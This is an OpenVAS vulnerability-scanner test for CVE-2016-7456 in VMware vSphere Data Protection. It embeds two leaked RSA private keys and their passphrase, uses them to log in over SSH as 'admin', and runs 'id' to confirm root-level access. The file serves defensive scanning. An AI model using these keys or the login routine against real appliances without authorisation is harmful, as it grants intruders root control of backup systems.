###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vmware_vsphere_data_protection_admin_known_ssh_key.nasl 13568 2019-02-11 10:22:27Z cfischer $
#
# VMSA-2016-0024: vSphere Data Protection (VDP) updates address SSH Key-Based authentication issue (admin_key)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140103");
  script_cve_id("CVE-2016-7456");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13568 $");
  script_name("VMSA-2016-0024: vSphere Data Protection (VDP) updates address SSH Key-Based authentication issue (admin_key)");

  script_xref(name:"URL", value:"http://www.vmware.com/security/advisories/VMSA-2016-0024.html");

  script_tag(name:"vuldetect", value:"Try to login with a known private ssh key");

  script_tag(name:"solution", value:"Apply the Patch");

  script_tag(name:"summary", value:"vSphere Data Protection (VDP) updates address SSH key-based authentication issue.");
  script_tag(name:"insight", value:"VDP contains a private SSH key with a known password that is configured to allow key-based
  authentication. Exploitation of this issue may allow an unauthorized remote attacker to log into the appliance with root privileges.");

  script_tag(name:"affected", value:"VDP 6.1.x, 6.0.x, 5.8.x, 5.5.x");

  script_tag(name:"last_modification", value:"$Date: 2019-02-11 11:22:27 +0100 (Mon, 11 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-12-28 11:03:22 +0100 (Wed, 28 Dec 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");
  script_category(ACT_ATTACK);
  script_family("General");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");

 exit(0);

}

include("ssh_func.inc");

port = get_ssh_port(default:22);

keys = make_list(
'-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,A0FC854090ADCD630A163F3FD6380E4F

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
-----END RSA PRIVATE KEY-----',
'-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,DFDBC4B8EF3708FC

f2/1GJu45AtuQBlhokUib9T3m4o54cehWHx5z/BdbUYpTqsf7420/Dsb2o69ALR0
4KzNQ9KWAGH6lt/XqCrzVOOHZ8WeWDUgW3oNzJ3Xbbhu+oxp2ENzEvrAiudqhQWo
Il491n4EHTuu7dyz3sWUPEwrV/TC8b33tauoXu7v97J1wE3IC/NTHscP0M6HBOEd
Ql+vyTRla2ZI7SWWg50CoqeKqrbDwace/ywccNz+G4TnfVOn32d9RZ1pPxOWofzp
FzM7Qnflf8zz4SGjd2izHgB9yz4eXkAlV0pJH1RKcn0SIKm05y9igbGNWoauvWtS
cmtpq7plMvklyA875cDa+qYBKx9MUIz+dj6HlcNi/Rc+e5/nhN5UgAGVyJoQO9vy
plEgoBObb4Ep6/no+EwlKo9/pcOXmuMptRIg+WFb9e1nPey917HEJUmFhiZ1bc/v
P/8PY/7N0sZdove3nNMTsIpiHYp8dJKnHo9pHnzV3YoTTAkHuMu2+JF2Btr0aw5W
io6GP06qe9dgb9mmhmAxwKi7O/bosJXrjP1aWKhxB8womMSEkqF0d2kbd/mX5z+Z
gezMIvU8ZJs/4hr+DJCqhM0Wi2cptu0ofr723brpk226CJrXTQPw7HHlwX3DGyYo
E1GRiRk0XiU/T2MszmBtCcFyPf/eZF8cGmoyEqk1VqOoMB9v9zFucrgmPeKZSP0E
c8JBnZ/T+zERQEHTVpJhsRuWoQUamXRvdVKUhvKC4XvWkpSoH9CDm8LTDxhr6EKo
TcPSa3ARIpbuoPzOkR4osl+gzZzTaSHXUTbMPh79d3E=
-----END RSA PRIVATE KEY-----');

user = 'admin';
pf = 'P3t3rPan';

foreach key ( keys )
{
  if( ! soc = open_sock_tcp( port ) ) continue;

  login = ssh_login( socket:soc, login:user, password:NULL, priv:key, passphrase:pf );

  if( login == 0 )
  {
    cmd = ssh_cmd( socket:soc, cmd:'id' );
    close( soc );
    if( cmd =~ "uid=[0-9]+.*gid=[0-9]+" )
    {
      security_message( port:port, data: 'It was possible to login as user `admin` using a known SSH private key with passphrase `' + pf  + '` and to execute the `id` command. Result:\n\n' + cmd + '\n');
      exit( 0 );
    }
    exit( 0 );
  }

  if( soc ) close( soc );
}

exit( 99 );